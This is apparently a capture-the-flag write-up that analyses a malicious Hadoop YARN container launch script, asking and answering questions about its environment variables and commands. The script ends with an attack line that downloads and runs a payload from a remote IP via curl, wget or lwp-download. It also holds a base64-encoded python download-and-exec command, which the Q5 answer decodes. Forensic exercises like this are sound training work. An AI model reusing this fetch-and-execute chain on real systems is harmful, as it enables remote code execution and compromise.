> # Bash Script

## Summary
- [Summary](#summary)
  - [Q1. What is the path set to the standard output log file?](#q1-what-is-the-path-set-to-the-standard-output-log-file)
  - [Q2. Which environment variable specifies the Java home directory?](#q2-which-environment-variable-specifies-the-java-home-directory)
  - [Q3. What is the value of the “NM\_HTTP\_PORT” environment variable?](#q3-what-is-the-value-of-the-nm_http_port-environment-variable)
  - [Q4. What directory is set as the “LOCAL\_DIRS” environment variable?](#q4-what-directory-is-set-as-the-local_dirs-environment-variable)
  - [Q5. The script executes a line at the end of it. What is it?](#q5-the-script-executes-a-line-at-the-end-of-it-what-is-it)
  - [Q6. Which command is used to create a copy of the launch script?](#q6-which-command-is-used-to-create-a-copy-of-the-launch-script)
  - [Q7. What command is executed to determine the directory contents?](#q7-what-command-is-executed-to-determine-the-directory-contents)
  - [Q8. What IP address is used for downloading a script from the remote server?](#q8-what-ip-address-is-used-for-downloading-a-script-from-the-remote-server)

### Q1. What is the path set to the standard output log file?
```bash
#!/bin/bash

set -o pipefail -e
export PRELAUNCH_OUT="/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/prelaunch.out"
exec >"${PRELAUNCH_OUT}"
export PRELAUNCH_ERR="/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/prelaunch.err"
exec 2>"${PRELAUNCH_ERR}"
echo "Setting up env variables"
export JAVA_HOME=${JAVA_HOME:-"/usr/lib/jvm/jre-1.8.0-openjdk-1.8.0.275.b01-1.el8_3.x86_64"}
export HADOOP_COMMON_HOME=${HADOOP_COMMON_HOME:-"/root/apps/hadoop-3.2.2"}
export HADOOP_HDFS_HOME=${HADOOP_HDFS_HOME:-"/root/apps/hadoop-3.2.2"}
export HADOOP_CONF_DIR=${HADOOP_CONF_DIR:-"/root/apps/hadoop-3.2.2/etc/hadoop"}
export HADOOP_YARN_HOME=${HADOOP_YARN_HOME:-"/root/apps/hadoop-3.2.2"}
export HADOOP_HOME=${HADOOP_HOME:-"/root/apps/hadoop-3.2.2"}
export PATH=${PATH:-"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin"}
export LANG=${LANG:-"en_US.utf8"}
export HADOOP_TOKEN_FILE_LOCATION="/root/apps/hadoopdata/nm-local-dir/usercache/dr.who/appcache/application_1617763119642_4002/container_1617763119642_4002_01_000001/container_tokens"
export CONTAINER_ID="container_1617763119642_4002_01_000001"
export NM_PORT="44043"
export NM_HOST="hadoop002"
export NM_HTTP_PORT="8042"
export LOCAL_DIRS="/root/apps/hadoopdata/nm-local-dir/usercache/dr.who/appcache/application_1617763119642_4002"
export LOCAL_USER_DIRS="/root/apps/hadoopdata/nm-local-dir/usercache/dr.who/"
export LOG_DIRS="/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001"
export USER="dr.who"
export LOGNAME="dr.who"
export HOME="/home/"
export PWD="/root/apps/hadoopdata/nm-local-dir/usercache/dr.who/appcache/application_1617763119642_4002/container_1617763119642_4002_01_000001"
export LOCALIZATION_COUNTERS="0,0,0,0,-5735020920"
export JVM_PID="$$"
export MALLOC_ARENA_MAX="4"
export NM_AUX_SERVICE_mapreduce_shuffle="AAA0+gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
export APPLICATION_WEB_PROXY_BASE="/proxy/application_1617763119642_4002"
export APP_SUBMIT_TIME_ENV="1623086508184"
echo "Setting up job resources"
echo "Copying debugging information"
# Creating copy of launch script
cp "launch_container.sh" "/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/launch_container.sh"
chmod 640 "/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/launch_container.sh"
# Determining directory contents
echo "ls -l:" 1>"/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/directory.info"
ls -l 1>>"/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/directory.info"
echo "find -L . -maxdepth 5 -ls:" 1>>"/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/directory.info"
find -L . -maxdepth 5 -ls 1>>"/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/directory.info"
echo "broken symlinks(find -L . -maxdepth 5 -type l -ls):" 1>>"/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/directory.info"
find -L . -maxdepth 5 -type l -ls 1>>"/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/directory.info"
echo "Launching container"
exec /bin/bash -c "(curl -s http://209.141.40.190/xms || wget -q -O - http://209.141.40.190/xms || lwp-download http://209.141.40.190/xms /tmp/xms) | bash -sh; bash /tmp/xms; rm -rf /tmp/xms; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -"
```

Var `PRELAUNCH`.<br>
**Answer:** /root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/prelaunch.out

### Q2. Which environment variable specifies the Java home directory?
The default Java home directory environment variable is `JAVA_HOME`.<br>
**Answer:** JAVA_HOME

### Q3. What is the value of the “NM_HTTP_PORT” environment variable?
**Answer:** 8042

### Q4. What directory is set as the “LOCAL_DIRS” environment variable?
**Answer:** /root/apps/hadoopdata/nm-local-dir/usercache/dr.who/appcache/application_1617763119642_4002

### Q5. The script executes a line at the end of it. What is it?
Decode the base64 string `cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc=` to get the answer.<br>
**Answer:** python -c 'import urllib;exec(urllib.urlopen("http://209.141.40.190/d.py").read())'

### Q6. Which command is used to create a copy of the launch script?
The line `cp "launch_container.sh" "/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/launch_container.sh"` is used to copy the script to another folder.<br>
**Answer:** cp

### Q7. What command is executed to determine the directory contents?
**Answer:** ls -l

### Q8. What IP address is used for downloading a script from the remote server?
The IP from the above python script.<br>
**Answer:** 209.141.40.190
